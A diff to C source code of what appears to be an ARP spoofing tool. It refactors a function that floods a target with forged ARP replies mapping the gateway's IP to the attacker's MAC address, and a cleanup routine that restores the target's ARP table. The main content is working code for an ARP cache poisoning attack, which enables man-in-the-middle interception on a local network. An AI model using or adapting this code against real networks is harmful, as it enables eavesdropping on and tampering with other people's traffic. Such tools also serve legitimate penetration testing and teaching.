@@ -64,20 +64,25 @@ short arp_receiver_start( struct net *_net )
 
 void arp_clear_arp( int signal )
 {
-    uint8_t src_hw[6];
-    uint8_t dst_hw[6];
-    uint8_t src_ip[4];
-    uint8_t dst_ip[4];
+    struct arpspf_eth_hdr *eth;
+    struct arpspf_arp_hdr *arp;
 
-    cnvrt_hw2b( endpoints.gateway_hw, src_hw );
-    cnvrt_hw2b( endpoints.target_hw,  dst_hw );
-    cnvrt_ip2b( endpoints.gateway,    src_ip );
-    cnvrt_ip2b( endpoints.target,     dst_ip );
+    arp = build_arp_hdr(
+        ARPOP_REPLY,
+        endpoints.target_hw,
+        endpoints.target,
+        endpoints.gateway_hw,
+        endpoints.gateway
+    );
+
+    eth = build_eth_hdr(
+        endpoints.target_hw, _net.hw
+    );
 
     v_out( VINF, "%s", "\nRestoring arp table...\n" );
-    for ( char i = 0 ; i < 5 ; i++ ) {
+    for ( char i = 0 ; i < 10 ; i++ ) {
         arp_inject(
-            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
+            lt, eth, arp
         );
         sleep( 1 );
     }
@@ -87,20 +92,23 @@ void arp_clear_arp( int signal )
 
 void __spoof( char *self_hw )
 {
-    uint8_t src_hw[6];
-    uint8_t dst_hw[6];
-    uint8_t src_ip[4];
-    uint8_t dst_ip[4];
+    struct arpspf_eth_hdr *eth;
+    struct arpspf_arp_hdr *arp;
 
-    cnvrt_hw2b( self_hw,             src_hw );
-    cnvrt_hw2b( endpoints.target_hw, dst_hw );
-    cnvrt_ip2b( endpoints.gateway,   src_ip );
-    cnvrt_ip2b( endpoints.target,    dst_ip );
+    arp = build_arp_hdr(
+        ARPOP_REPLY,
+        endpoints.target_hw,
+        endpoints.target,
+        self_hw,
+        endpoints.gateway
+    );
+
+    eth = build_eth_hdr(
+        endpoints.target_hw, self_hw
+    );
 
     for ( ;; ) {
-        arp_inject(
-            lt, ARPOP_REPLY, src_hw, src_ip, dst_hw, dst_ip
-        );
+        arp_inject( lt, eth, arp );
         sleep( 2 );
     }
 }
